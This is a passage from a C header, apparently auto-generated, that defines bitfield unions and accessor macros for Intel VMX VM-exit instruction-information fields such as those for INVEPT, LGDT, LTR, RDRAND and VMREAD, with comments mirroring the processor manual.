         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used.
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_BIT        7
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_FLAG       0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE_MASK       0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_ADDRESS_SIZE(_)         (((_) >> 7) & 0x07)
        UINT64 Reserved2 : 5;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used. Undefined for VM exits due to execution of INS.
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_BIT    15
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_FLAG   0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER_MASK   0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS_SEGMENT_REGISTER(_)     (((_) >> 15) & 0x07)
        UINT64 Reserved3 : 46;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_INS_OUTS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for INVEPT, INVPCID, and INVVPID
 */
typedef union
{
    struct
    {
        /**
         * @brief Scaling
         *
         * [Bits 1:0] 0: no scaling
         * 1: scale by 2
         * 2: scale by 4
         * 3: scale by 8 (used only on processors that support Intel 64 architecture)
         * Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_BIT           0
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_FLAG          0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING_MASK          0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SCALING(_)            (((_) >> 0) & 0x03)
        UINT64 Reserved1 : 5;

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used.
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_BIT      7
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_FLAG     0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE_MASK     0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_ADDRESS_SIZE(_)       (((_) >> 7) & 0x07)
        UINT64 Reserved2 : 5;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used. Undefined for VM exits due to execution of INS.
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_BIT  15
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_SEGMENT_REGISTER(_)   (((_) >> 15) & 0x07)

        /**
         * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

        /**
         * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_GENERAL_PURPOSE_REGISTER_INVALID(_) (((_) >> 22) & 0x01)

        /**
         * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no base register (bit 27 is
         * set).
         */
        UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_BIT     23
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_FLAG    0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_MASK    0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER(_)      (((_) >> 23) & 0x0F)

        /**
         * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

        /**
         * [Bits 31:28] Reg2 (same encoding as IndexReg above).
         */
        UINT64 Register2 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_BIT        28
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_FLAG       0xF0000000
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2_MASK       0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE_REGISTER_2(_)         (((_) >> 28) & 0x0F)
        UINT64 Reserved3 : 32;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_INVALIDATE;

/**
 * @brief VM-Exit Instruction-Information Field as Used for LIDT, LGDT, SIDT, or SGDT
 */
typedef union
{
    struct
    {
        /**
         * @brief Scaling
         *
         * [Bits 1:0] 0: no scaling
         * 1: scale by 2
         * 2: scale by 4
         * 3: scale by 8 (used only on processors that support Intel 64 architecture)
         * Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_BIT     0
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_FLAG    0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING_MASK    0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SCALING(_)      (((_) >> 0) & 0x03)
        UINT64 Reserved1 : 5;

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used.
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)
        UINT64 Reserved2 : 1;

        /**
         * @brief Operand size
         *
         * [Bit 11] 0: 16-bit
         * 1: 32-bit
         * Undefined for VM exits from 64-bit mode.
         */
        UINT64 OperandSize : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_BIT 11
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_FLAG 0x800
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_OPERAND_SIZE(_) (((_) >> 11) & 0x01)
        UINT64 Reserved3 : 3;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used.
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

        /**
         * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

        /**
         * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID(_) (((_) >> 22) & 0x01)

        /**
         * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no base register (bit 27 is
         * set).
         */
        UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

        /**
         * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

        /**
         * @brief Instruction identity
         *
         * [Bits 29:28] 0: SGDT
         * 1: SIDT
         * 2: LGDT
         * 3: LIDT
         */
        UINT64 Instruction : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_BIT 28
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_FLAG 0x30000000
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS_INSTRUCTION(_)  (((_) >> 28) & 0x03)
        UINT64 Reserved4 : 34;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_GDTR_IDTR_ACCESS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for LLDT, LTR, SLDT, and STR
 */
typedef union
{
    struct
    {
        /**
         * @brief Scaling
         *
         * [Bits 1:0] 0: no scaling
         * 1: scale by 2
         * 2: scale by 4
         * 3: scale by 8 (used only on processors that support Intel 64 architecture)
         * Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_BIT       0
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_FLAG      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING_MASK      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SCALING(_)        (((_) >> 0) & 0x03)
        UINT64 Reserved1 : 1;

        /**
         * [Bits 6:3] Reg1. Undefined for memory instructions (bit 10 is clear).
         */
        UINT64 Reg1 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_BIT         3
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_FLAG        0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1_MASK        0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_REG_1(_)          (((_) >> 3) & 0x0F)

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used. Undefined for register instructions (bit 10 is set).
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_BIT  7
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_ADDRESS_SIZE(_)   (((_) >> 7) & 0x07)

        /**
         * [Bit 10] Mem/Reg (0 = memory; 1 = register).
         */
        UINT64 MemoryRegister : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_BIT 10
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_FLAG 0x400
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_MEMORY_REGISTER(_) (((_) >> 10) & 0x01)
        UINT64 Reserved2 : 4;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used. Undefined for register instructions (bit 10 is set).
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

        /**
         * [Bits 21:18] General-purpose register. Undefined for register instructions (bit 10 is set) and for memory instructions
         * with no index register (bit 10 is clear and bit 22 is set).
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

        /**
         * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit 10 is set).
         */
        UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_GENERAL_PURPOSE_REGISTER_INVALID(_) (((_) >> 22) & 0x01)

        /**
         * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for register instructions (bit 10 is set) and for memory
         * instructions with no base register (bit 10 is clear and bit 27 is set).
         */
        UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER(_)  (((_) >> 23) & 0x0F)

        /**
         * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit 10 is set).
         */
        UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

        /**
         * @brief Instruction identity
         *
         * [Bits 29:28] 0: SLDT
         * 1: STR
         * 2: LLDT
         * 3: LTR
         */
        UINT64 Instruction : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_BIT   28
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_FLAG  0x30000000
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION_MASK  0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS_INSTRUCTION(_)    (((_) >> 28) & 0x03)
        UINT64 Reserved3 : 34;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_LDTR_TR_ACCESS;

/**
 * @brief VM-Exit Instruction-Information Field as Used for RDRAND and RDSEED
 */
typedef union
{
    struct
    {
        UINT64 Reserved1 : 3;

        /**
         * [Bits 6:3] Destination register.
         */
        UINT64 DestinationRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_BIT 3
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_FLAG 0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_DESTINATION_REGISTER(_) (((_) >> 3) & 0x0F)
        UINT64 Reserved2 : 4;

        /**
         * @brief Operand size
         *
         * [Bits 12:11] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit
         * The value 3 is not used.
         */
        UINT64 OperandSize : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_BIT   11
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_FLAG  0x1800
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE_MASK  0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED_OPERAND_SIZE(_)    (((_) >> 11) & 0x03)
        UINT64 Reserved3 : 51;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_RDRAND_RDSEED;

/**
 * @brief VM-Exit Instruction-Information Field as Used for VMCLEAR, VMPTRLD, VMPTRST, VMXON, XRSTORS, and XSAVES
 */
typedef union
{
    struct
    {
        /**
         * @brief Scaling
         *
         * [Bits 1:0] 0: no scaling
         * 1: scale by 2
         * 2: scale by 4
         * 3: scale by 8 (used only on processors that support Intel 64 architecture)
         * Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_BIT       0
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_FLAG      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING_MASK      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SCALING(_)        (((_) >> 0) & 0x03)
        UINT64 Reserved1 : 5;

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used.
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_BIT  7
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE(_)   (((_) >> 7) & 0x07)
        UINT64 Reserved2 : 5;

        /**
         * @brief Segment register
         *
         * [Bits 17:15] 0: ES
         * 1: CS
         * 2: SS
         * 3: DS
         * 4: FS
         * 5: GS
         * Other values not used.
         */
        UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

        /**
         * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit 22 is set).
         */
        UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

        /**
         * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID(_) (((_) >> 22) & 0x01)

        /**
         * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no base register (bit 27 is
         * set).
         */
        UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER(_)  (((_) >> 23) & 0x0F)

        /**
         * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
         */
        UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)
        UINT64 Reserved3 : 36;
    };

    UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES;

/**
 * @brief VM-Exit Instruction-Information Field as Used for VMREAD and VMWRITE
 */
typedef union
{
    struct
    {
        /**
         * @brief Scaling
         *
         * [Bits 1:0] 0: no scaling
         * 1: scale by 2
         * 2: scale by 4
         * 3: scale by 8 (used only on processors that support Intel 64 architecture)
         * Undefined for register instructions (bit 10 is set) and for memory instructions with no index register (bit 10 is clear
         * and bit 22 is set).
         */
        UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_BIT       0
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_FLAG      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_MASK      0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING(_)        (((_) >> 0) & 0x03)
        UINT64 Reserved1 : 1;

        /**
         * [Bits 6:3] Reg1. Undefined for memory instructions (bit 10 is clear).
         */
        UINT64 Register1 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_BIT    3
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_FLAG   0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_MASK   0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1(_)     (((_) >> 3) & 0x0F)

        /**
         * @brief Address size
         *
         * [Bits 9:7] 0: 16-bit
         * 1: 32-bit
         * 2: 64-bit (used only on processors that support Intel 64 architecture)
         * Other values not used. Undefined for register instructions (bit 10 is set).
         */
        UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_BIT  7
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE(_)   (((_) >> 7) & 0x07)

        /**
         * [Bit 10] Mem/Reg (0 = memory; 1 = register).
         */
        UINT64 MemoryRegister : 1;
